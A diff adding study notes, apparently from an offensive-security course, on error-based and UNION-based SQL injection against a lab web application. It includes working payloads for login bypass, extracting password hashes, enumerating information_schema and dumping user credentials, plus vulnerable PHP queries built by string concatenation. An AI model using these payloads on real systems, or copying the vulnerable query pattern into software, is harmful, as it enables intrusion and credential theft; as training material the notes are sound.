@@ -75,7 +75,66 @@ SELECT * FROM sysusers
 or
 select * from sys.database_principals;
 
+### 10.2.1. Identifying SQLi via Error-based Payloads
+$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
 
+offsec' OR 1=1 -- //
+
+SQL injection inband = vulnerable application provides result of query with the application returned value
+Most production web apps do not show error messages as showing these messages is considered a security flaw
+
+' or 1=1 in (select @@version) -- //
+
+MySQL accepts both version() and @@version statements.
+
+dump information from users table
+' OR 1=1 in (SELECT * FROM users) -- //
+
+There was an error from trying to select too many columns. This is because we used * in the query which grabs every column.
+
+select only password from users
+
+' or 1=1 in (SELECT password FROM users) -- //
+This returned Truncated incorrect double values... those were the hashes
+
+You can use "where" to narrow which account has which hash while still abiding the 1 column limitation in this example
+' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+
+### 10.2.2 UNION-based Payloads
+
+Whenever we're dealing with in-band SQL injections and the result of the query is displayed along with the application-returned value, we should also test for UNION-based SQL injections.
+
+2 conditions needed for union sqli attacks
+The injected UNION query has to include the same number of columns as the original query.
+The data types need to be compatible between each column.
+
+$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
+
+name LIKE '".$_POST["search_input"]."%'"; -- this returns any value that has input from post request and a wildcard of characters (specified by the %)
+
+Figure out how many columns are needed. increment 1 until you hit an error
+' ORDER BY 1-- //
+
+replace uneeded extra columns with null
+%' UNION SELECT database(), user(), @@version, null, null -- //
+
+Since we want to retrieve all the data from the customers table, we'll use the percentage sign followed by a single quote to close the search parameter. 
+
+The query statement has a certain layout of data types... etc column 1 is integer, 2 is string, etc. We can try shifting
+the nulls and sqli data to get what we need like so
+
+' UNION SELECT null, null, database(), user(), @@version  -- //
+notice the placement of nulls, and database here versus the statement above
+
+This web application explicitly omits the output from the first column because IDs are not usually useful information for end users.
+
+
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+see other tables in current database
+
+' UNION SELECT null, username, password, description, null FROM users -- //
+attempt to dump passwords
+extra reading
 
 
 
@@ -91,9 +150,12 @@ select * from sys.database_principals;
 Extra Reading  
 
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><  
+10.2.2 UNION-based Payloads
+https://www.w3schools.com/sql/sql_union.asp 
+https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html
+https://en.wikipedia.org/wiki/MD5
 
 10.1.2. DB Types and Characteristics
-
 https://www.mysql.com/
   mysql main website
 
